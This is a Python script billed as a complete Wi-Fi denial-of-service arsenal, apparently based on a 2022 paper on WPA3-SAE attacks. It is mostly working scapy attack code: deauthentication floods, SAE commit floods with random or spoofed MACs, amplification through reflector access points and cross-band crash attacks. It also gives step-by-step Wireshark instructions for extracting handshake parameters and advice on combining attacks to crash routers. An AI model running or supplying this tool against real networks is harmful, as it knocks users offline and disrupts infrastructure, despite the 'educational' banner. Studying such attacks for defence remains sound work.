#!/usr/bin/env python3
"""
================================================================================
Wi-Fi DoS Orchestrator - COMPLETE ARSENAL (26 Attacks)
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications (2022)

FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
"""

import subprocess
import time
import os
import sys
import csv
import glob
import random
from multiprocessing import Process, Value

# =====================================================================================
# ======================== CENTRAL CONFIGURATION ======================================
# =====================================================================================

# --- 1. TARGET DATA ---
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"

# --- 2. SAE PARAMETERS (EXTRACTED VIA WIRESHARK) ---
# IMPORTANT: Enter DIFFERENT values for 2.4 GHz and 5 GHz!

# > Parameters for 2.4 GHz Network
SAE_SCALAR_2_4_HEX = 'INSERT_2_4_SCALAR_HERE'
SAE_FINITE_2_4_HEX = 'INSERT_2_4_FINITE_HERE'

# > Parameters for 5 GHz Network
SAE_SCALAR_5_HEX = 'INSERT_5_SCALAR_HERE'
SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'

# --- 3. OPTIONAL SCANNER ---
SCANNER_INTERFACE = "" # e.g. "wlan2mon" or ""

# --- 4. MANUAL CHANNEL ASSIGNMENT (Required without scanner) ---
MANUELLER_KANAL_5GHZ = "36"
MANUELLER_KANAL_2_4GHZ = "1"

# --- 5. TARGET CLIENTS (For targeted attacks like Deauth-Flood) ---
# Enter the real MAC addresses of connected devices here.
#
# IMPORTANT FOR RADIO CONFUSION ATTACK:
# The clients listed here must be visible on the band you are attacking FROM.
# - If you start the attack on 2.4 GHz (Adapter on Channel 1-13): 
#   -> Enter MAC addresses of clients currently connected to 2.4 GHz.
# - If you start the attack on 5 GHz (Adapter on Channel 36+):   
#   -> Enter MAC addresses of clients currently connected to 5 GHz.
TARGET_STA_MACS = [
    "AA:BB:CC:DD:EE:11",
    "AA:BB:CC:DD:EE:11"
]

# --- 6. AMPLIFICATION REFLECTORS ---
# Enter the BSSIDs of ALL APs here that should be used as "Reflectors" or "Amplifiers".
# The more APs listed here, the greater the channel saturation.
AMPLIFICATION_REFLECTOR_APS_5GHZ = [
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11",
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11"  
]
AMPLIFICATION_REFLECTOR_APS_2_4GHZ = [
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11"     
]
# ====================== ENCYCLOPEDIA OF ATTACKS ======================
#
# Here you will find a detailed explanation for each available attack type.
#
# --- Category: WPA3-Specific Attacks (Modern) ---
#
# "omnivore": Strongest flooding attack with constantly changing MACs.
#     Effect: Floods the router with WPA3 connection attempts from ever-changing, random MAC addresses.
#             This forces the router to reserve memory (RAM) for each attempt until it is full.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3 (Very effective). WPA2 APs usually discard the packets without much load.
#
# "muted": Flooding attack with a single, static MAC.
#     Effect: Similar to "omnivore", but all attacks come from the same MAC address. This aims to
#             bypass specific defense mechanisms that only react to attacks from many sources.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "hasty": Confusion attack with Commit & Confirm packets.
#     Effect: Sends not only the first step of the WPA3 handshake (Commit) but also immediately the second (Confirm).
#             This aims to confuse the router's state machine and generate CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "double_decker": Combines "omnivore" & "muted" for maximum stress.
#     Effect: Described by the authors as "powerful". It attacks the router simultaneously
#             before and after its anti-DoS defense is activated. Maximum memory and CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
#     Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
#             send a disproportionately large number of response frames, thereby overloading itself.
#     Suitable for: WPA3.
# --- Category: Universal & Vendor-Specific Attacks ---
#
# "open_auth": Classic DoS attack with Open Authentication requests.
#     Effect: A "Legacy" attack that floods the router with simple, old authentication requests.
#             According to studies, this is particularly effective at overloading the basic CPU queue.
#     Most effective band: 5 GHz (According to study, most effective here).
#     Suitable for: WPA2 and WPA3 (Universally effective). 5 GHz.
#
# "amplification": Spoofs sender MACs of legitimate devices.
#     Effect: The attacker sends packets to the target AP but spoofs the sender MAC address of another
#             device in the network. The target AP responds to the innocent device, clogging the channel.
#     Most effective band: 2.4 GHz (According to study, most effective here as this band is often more crowded).
#     Suitable for: WPA2 and WPA3 (Universally effective, as WPA2 devices also respond with error messages that clog the channel) 2.4 GHz Band.
#
# "radio_confusion": GENERIC Cross-Band Attack (Broadcom & MediaTek).
#     Effect: Sends SAE frames to the BSSID of the *opposite* band.
#     Mechanism: - If you start the attack on the 2.4 GHz band, the 5 GHz network is targeted/crashed.
#                - If you start the attack on the 5 GHz band, the 2.4 GHz network is targeted/crashed.
#     Why generic? This script automatically detects the adapter's band and targets the opposite one.
#                  It covers specific vendor vulnerabilities described in the paper:
#                  - Case 6 (Broadcom) & Case 13 Reverse (MediaTek) -> Attack from 2.4GHz to crash 5GHz.
#                  - Case 6 Reverse (Broadcom) & Case 13 (MediaTek) -> Attack from 5GHz to crash 2.4GHz.
#     Note: In the 'Master' script, these are split into specific cases. Here, one logic rules them all.
#
# "back_to_the_future": Overloads the memory of a WPA2 AP with WPA3 packets.
#     Effect: Exploits a bug in some WPA2 APs that react incorrectly to WPA3 packets. The attack floods
#             the WPA2 AP with these packets to fill its memory and cause it to crash.
#     Most effective band: Both bands (Universal, targets WPA2 APs).
#     Suitable for: WPA2 (Specifically targets WPA2 APs).
#
# ==============================================================================================
# --- CENTRAL ADAPTER & ATTACK CONFIGURATION ---
# Enter each attack adapter here with its target band and the desired attack.
ADAPTER_KONFIGURATION = {
    # --- 5 GHz Band ---
    # "wlan2mon": {"band": "5GHz", "angriff": "amplification"},
    
    # --- 2.4 GHz Band ---
    # "wlan1mon": {"band": "2.4GHz", "angriff": "amplification"},
    # "wlan3mon": {"band": "2.4GHz", "angriff": "omnivore"},
     "wlan4mon": {"band": "2.4GHz", "angriff": "double_decker"}
}
# ==============================================================================================
# ================= WHY MIXING ATTACKS IS SO EFFECTIVE (A "SYMPHONY OF CHAOS") =================
#
# The study shows that different attacks burden a router's resources in unique ways.
# By launching multiple, different attacks simultaneously, you create a multi-vector attack
# that is far more effective than an attack of a single type. The router not only has to deal
# with high volume but must handle multiple independent crises simultaneously.
#
# 1.  ATTACKING DIFFERENT RESOURCES:
#     - CPU OVERLOAD: Attacks like "open_auth" and "hasty" force the router to perform logic checks
#       and state management for every packet. This consumes massive amounts of CPU cycles
#       as it has to "think" about every invalid frame before discarding it.
#     - MEMORY EXHAUSTION: Attacks like "omnivore" and "double_decker" force the router
#       to allocate RAM to manage thousands of fake clients (MAC addresses).
#       This rapidly fills the router's RAM until it can no longer create new connections.
#
# 2.  BYPASSING DEFENSE MECHANISMS:
#     A defense mechanism designed for one attack type (like the Anti-Clogging "Cookie" system
#     against SAE floods) is completely ineffective against another attack type (like an old "open_auth" flood).
#     The router's specialized countermeasures are simply overwhelmed by the variety of attacks.
#
# 3.  CASCADING SYSTEM FAILURE:
#     By stressing CPU, memory, and protocol logic simultaneously, the router's operating system
#     is forced to "juggle" multiple critical errors at once.
#     This leads to resource starvation, freezing of processes, and ultimately a much faster
#     and almost guaranteed crash or system standstill than a single, monolithic attack could ever achieve.
#
# ==============================================================================================
# ================= GUIDE TO EXTRACTING SAE PARAMETERS WITH WIRESHARK =================
#
# 1.  PUT WIFI ADAPTER IN MONITOR MODE:
#     Ensure a WiFi adapter is in monitor mode to capture network traffic.
#     Example: `sudo airmon-ng start wlan0`
#
# 2.  START WIRESHARK AND CAPTURE TRAFFIC:
#     - Start Wireshark with sudo privileges: `sudo wireshark`
#     - Select the monitor interface (e.g., wlan0mon) and start capturing.
#
# 3.  PROVOKE A WPA3 HANDSHAKE:
#     - Connect a legitimate device (e.g., your phone) to the WPA3 target network. Use the WRONG password! Otherwise, the attack won't work!
#     - The first packets during the connection setup contain the SAE handshake.
#
# 4.  FILTER PACKETS IN WIRESHARK:
#     - Stop capturing after the connection attempt.
#     - To see only relevant packets, enter the following display filter:
#      wlan.fc.type_subtype == 0x0b
#
# 5.  FIND AND ANALYZE THE COMMIT PACKET:
#     - Look in the packet list for an "Authentication" frame.
#
# 6.  EXTRACT SCALAR AND FINITE ELEMENT:
#     - In the middle pane (Packet Details), navigate to:
#       -> IEEE 802.11 wireless LAN -> Tagged Parameters -> Tag: SAE -> ...
#
# 7.  COPY AND PASTE VALUES:
#     - Right-click on the "Scalar" field, select "Copy" -> "Value", and paste it into `SAE_SCALAR_HEX`.
#     - Repeat this for the "Finite Field Element" and paste it into `SAE_FINITE_ELEMENT_HEX`.
# ==============================================================================================
# ======================== ATTACK LOGIC ========================================================
# ==============================================================================================

def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex, finite_hex, counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
    from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp, Raw
    
    print(f"[INFO] Process for {interface} ({attack_type}) started: Setting channel to {channel}...")
    try:
        subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[SUCCESS] Channel for {interface} set to {channel}.")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"[ERROR] Channel switch for {interface} failed.")
        return

    # Prepare SAE Payload
    try:
        SAE_SCALAR_BYTES = bytes.fromhex(scalar_hex)
        SAE_FINITE_BYTES = bytes.fromhex(finite_hex)
    except (ValueError, TypeError):
        print(f"[ERROR] Invalid SAE HEX values for {interface}. Stopping process.")
        return
    
    try:
        while True:
            # ==========================================
            # 1. DEAUTH FLOOD
            # ==========================================
            if attack_type == "deauth_flood":
                targets_this_round = (sta_macs or []) + ["ff:ff:ff:ff:ff:ff"]
                if not sta_macs: print(f"[WARNING-DEAUTH] No target client for {interface}. Broadcast only.", file=sys.stderr)

                for sta_mac in targets_this_round:
                    packet_to_client = RadioTap()/Dot11(addr1=sta_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                    packets = [packet_to_client]
                    if sta_mac != "ff:ff:ff:ff:ff:ff":
                        packets.append(RadioTap()/Dot11(addr1=bssid, addr2=sta_mac, addr3=bssid)/Dot11Deauth(reason=7))

                    sendp(packets, count=50, inter=0.01, iface=interface, verbose=0)
                    with counter.get_lock(): counter.value += len(packets) * 50
                time.sleep(0.2)

            # ==========================================
            # 2. AMPLIFICATION
            # ==========================================
            elif attack_type == "amplification":
                if not amplification_targets or len(amplification_targets) < 2: 
                    print(f"[WARNING] 'amplification' on {interface} needs >2 reflectors. Paused.", file=sys.stderr)
                    time.sleep(999); continue
                source_ap, dest_ap = random.sample(amplification_targets, 2)
                
                packet = RadioTap()/Dot11(type=0, subtype=11, addr1=dest_ap, addr2=source_ap, addr3=dest_ap)/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                sendp(packet, count=50, inter=0.02, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 50
                time.sleep(0.5)

            # ==========================================
            # 3. DOUBLE DECKER
            # ==========================================
            elif attack_type == "double_decker":
                target_bssid = bssid
                
                # Phase 1: Omnivore (Random MACs)
                omnivore_dot11 = Dot11(type=0, subtype=11, addr1=target_bssid, addr2=str(RandMAC()), addr3=target_bssid)
                packet_omnivore = RadioTap()/omnivore_dot11/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                
                # Phase 2: Muted (Fixed MAC)
                muted_mac = sta_macs[0] if sta_macs else "DE:AD:BE:EF:CA:FE"
                muted_dot11 = Dot11(type=0, subtype=11, addr1=target_bssid, addr2=muted_mac, addr3=target_bssid)
                packet_muted = RadioTap()/muted_dot11/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                
                sendp(packet_omnivore, count=64, inter=0.005, iface=interface, verbose=0)
                sendp(packet_muted, count=64, inter=0.005, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 128
                time.sleep(0.5)
            
            # ==========================================
            # 4. GENERIC SAE ATTACKS (Omnivore, Muted, Hasty, etc.)
            # ==========================================
            else:
                # Handle MAC address (Random or Fixed)
                if attack_type == "muted":
                    mac_to_use = sta_macs[0] if sta_macs else "DE:AD:BE:EF:CA:FE"
                else:
                    mac_to_use = str(RandMAC())
                
                # Handle Target BSSID (Normal or Cross-Band)
                if attack_type == "radio_confusion":
                    target_bssid = opposite_bssid 
                else:
                    target_bssid = bssid
                
                dot11 = Dot11(type=0, subtype=11, addr1=target_bssid, addr2=mac_to_use, addr3=target_bssid)
                packet = None
                
                # SAE-based attacks
                if attack_type in ["omnivore", "muted", "back_to_the_future", "radio_confusion", "hasty", "cookie_guzzler"]: 
                    packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_BYTES
                    
                    # Hasty adds the Confirm frame immediately
                    if attack_type == "hasty":
                        confirm_packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=2, status=0)
                        packet = [packet, confirm_packet]

                # Open Authentication
                elif attack_type == "open_auth": 
                    packet = RadioTap()/dot11/Dot11Auth(algo=0, seqnum=1, status=0)

                # Not implemented
                elif attack_type == "gobbler":
                    print(f"[WARNING] '{attack_type}' not implemented. Paused.", file=sys.stderr)
                    time.sleep(999); continue

                # Send
                if packet:
                    sendp(packet, count=128, inter=0.005, iface=interface, verbose=0)
                    with counter.get_lock(): counter.value += 128 * (2 if isinstance(packet, list) else 1)
                
                time.sleep(0.5)
                    
    except KeyboardInterrupt: pass

def cleanup(proc_dict):
    print("\n[INFO] Cleaning up and terminating all processes...")
    for proc in proc_dict.values():
        if proc and isinstance(proc, (Process, subprocess.Popen)):
            try:
                if isinstance(proc, Process) and proc.is_alive(): proc.terminate()
                elif isinstance(proc, subprocess.Popen) and proc.poll() is None: proc.kill()
            except Exception: pass
    for f in glob.glob("scan_result*"):
        try: os.remove(f)
        except OSError: pass
    print("[INFO] Cleanup completed.")

def get_target_info_from_csv(csv_file_path):
    targets_info = {'5ghz': None, '2.4ghz': None}
    try:
        with open(csv_file_path, 'r', errors='ignore') as f: lines = f.readlines()
        ap_start_index = -1; client_start_index = len(lines)
        for i, line in enumerate(lines):
            if "BSSID, First time seen" in line: ap_start_index = i + 1
            elif "Station MAC, First time seen" in line: client_start_index = i; break
        if ap_start_index == -1: return targets_info
        ap_lines = [line for line in lines[ap_start_index:client_start_index] if line.strip()]
        reader = csv.reader(ap_lines)
        for row in reader:
            if not row or len(row) < 4: continue
            try:
                bssid, channel_str = row[0].strip().upper(), row[3].strip()
                if not channel_str or not channel_str.isdigit() or int(channel_str) <= 0: continue
                channel = int(channel_str)
                info = {'channel': str(channel)}
                if bssid == TARGET_BSSID_5GHZ.upper(): targets_info['5ghz'] = info
                elif bssid == TARGET_BSSID_2_4GHZ.upper(): targets_info['2.4ghz'] = info
            except (ValueError, IndexError): continue
    except Exception: pass
    return targets_info

def main():
    if os.geteuid() != 0: sys.exit("[ERROR] This script must be run with sudo privileges.")
    
    print("[INFO] Cleaning up old scan files...")
    for f in glob.glob("scan_result*"):
        try: os.remove(f)
        except OSError: pass

    scanner_aktiv = bool(SCANNER_INTERFACE)
    manuelle_zuweisung = bool(MANUELLER_KANAL_5GHZ and MANUELLER_KANAL_2_4GHZ)

    if not scanner_aktiv and not manuelle_zuweisung: sys.exit("[ERROR] Scanner is disabled, but no manual channels were entered.")
    if not ADAPTER_KONFIGURATION: sys.exit("[ERROR] No attack adapters defined in ADAPTER_KONFIGURATION.")

    current_targets = {'5ghz': None, '2.4ghz': None}; csv_filename = None
    procs = {}; counters = {iface: Value('L', 0) for iface in ADAPTER_KONFIGURATION}

    try:
        if manuelle_zuweisung and not scanner_aktiv:
            print("[INFO] Manual channel assignment active. Scan skipped.")
            current_targets['5ghz'] = {'channel': MANUELLER_KANAL_5GHZ}
            current_targets['2.4ghz'] = {'channel': MANUELLER_KANAL_2_4GHZ}
        elif scanner_aktiv:
            print(f"[INFO] Starting channel scan with {SCANNER_INTERFACE}...")
            procs['scanner'] = subprocess.Popen(['airodump-ng', SCANNER_INTERFACE, '--band', 'abg', '--write', 'scan_result', '--output-format', 'csv'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            for i in range(90):
                files = glob.glob("scan_result*.csv")
                if files:
                    csv_filename = files[0]; temp_targets = get_target_info_from_csv(csv_filename)
                    if temp_targets.get('5ghz'): current_targets['5ghz'] = temp_targets['5ghz']
                    if temp_targets.get('2.4ghz'): current_targets['2.4ghz'] = temp_targets['2.4ghz']
                
                status_5g = f"CH {current_targets['5ghz']['channel']}" if current_targets.get('5ghz') else "Searching..."; 
                status_2g = f"CH {current_targets['2.4ghz']['channel']}" if current_targets.get('2.4ghz') else "Searching..."
                sys.stdout.write(f"\r[INFO] Scan progress: [5GHz: {status_5g}] [2.4GHz: {status_2g}] ({i+1}/90s)"); sys.stdout.flush()
                if current_targets.get('5ghz') and current_targets.get('2.4ghz'): print("\n[SUCCESS] Both targets found!"); break
                time.sleep(1)
            
            if not current_targets.get('5ghz'): print("\n[WARNING] 5-GHz target not found in scan!")
            if not current_targets.get('2.4ghz'): print("\n[WARNING] 2.4-GHz target not found in scan!")
            if not current_targets.get('5ghz') and not current_targets.get('2.4ghz'):
                raise FileNotFoundError("[ERROR] Could not find any of the targets.")

        print("\n[INFO] Starting attack processes...")
        while True:
            if scanner_aktiv and csv_filename:
                new_targets = get_target_info_from_csv(csv_filename)
                interfaces_to_restart = []
                if new_targets.get('5ghz') and current_targets.get('5ghz') and new_targets['5ghz']['channel'] != current_targets['5ghz']['channel']:
                    print(f"\n[!!!] 5GHz CHANNEL CHANGE DETECTED! New: {new_targets['5ghz']['channel']}")
                    current_targets['5ghz'] = new_targets['5ghz']
                    interfaces_to_restart.extend([iface for iface, conf in ADAPTER_KONFIGURATION.items() if conf['band'] == '5GHz'])
                if new_targets.get('2.4ghz') and current_targets.get('2.4ghz') and new_targets['2.4ghz']['channel'] != current_targets['2.4ghz']['channel']:
                    print(f"\n[!!!] 2.4GHz CHANNEL CHANGE DETECTED! New: {new_targets['2.4ghz']['channel']}")
                    current_targets['2.4ghz'] = new_targets['2.4ghz']
                    interfaces_to_restart.extend([iface for iface, conf in ADAPTER_KONFIGURATION.items() if conf['band'] == '2.4GHz'])
                if interfaces_to_restart:
                    print(f"[INFO] Restarting processes for: {', '.join(set(interfaces_to_restart))}")
                    for interface in set(interfaces_to_restart):
                        if procs.get(interface) and procs[interface].is_alive():
                            procs[interface].terminate(); procs[interface].join(); del procs[interface]

            for interface, config in ADAPTER_KONFIGURATION.items():
                if interface not in procs or not procs[interface].is_alive():
                    band = config['band']
                    attack_type = config['angriff']
                    target_info = current_targets.get('5ghz' if band == '5GHz' else '2.4ghz')
                    
                    if target_info and target_info.get('channel'):
                        channel = target_info['channel']
                        bssid = TARGET_BSSID_5GHZ if band == '5GHz' else TARGET_BSSID_2_4GHZ
                        opposite_bssid = TARGET_BSSID_2_4GHZ if band == '5GHz' else TARGET_BSSID_5GHZ
                        
                        amplification_list = None
                        if attack_type == "amplification":
                            amplification_list = AMPLIFICATION_REFLECTOR_APS_5GHZ if band == '5GHz' else AMPLIFICATION_REFLECTOR_APS_2_4GHZ
                        
                        # ==================================================
                        # SMART SAE PARAMETER SELECTION
                        # ==================================================
                        # 1. Determine TARGET band (Normal or Cross-Band)
                        if attack_type == "radio_confusion":
                            target_band_for_params = '5GHz' if band == '2.4GHz' else '2.4GHz'
                        else:
                            target_band_for_params = band

                        # 2. Select parameters
                        if target_band_for_params == '5GHz':
                            scalar_to_use = SAE_SCALAR_5_HEX
                            finite_to_use = SAE_FINITE_5_HEX
                        else:
                            scalar_to_use = SAE_SCALAR_2_4_HEX
                            finite_to_use = SAE_FINITE_2_4_HEX

                        args = (interface, bssid, channel, attack_type, scalar_to_use, finite_to_use, counters[interface])
                        kwargs = {'sta_macs': TARGET_STA_MACS, 'amplification_targets': amplification_list, 'opposite_bssid': opposite_bssid}
                        
                        procs[interface] = Process(target=run_attacker_process, args=args, kwargs=kwargs)
                        procs[interface].start()

            status_line = " | ".join([f"{iface}({conf['angriff'][:6]}..): {counters[interface].value}" for iface, conf in ADAPTER_KONFIGURATION.items()])
            sys.stdout.write(f"\r[RUNNING] {status_line}"); sys.stdout.flush()
            time.sleep(5)

    except (FileNotFoundError, RuntimeError) as e: print(f"\n{e}")
    except KeyboardInterrupt: print("\n[INFO] User cancellation detected.")
    finally: cleanup(procs)

if __name__ == "__main__":
    main()
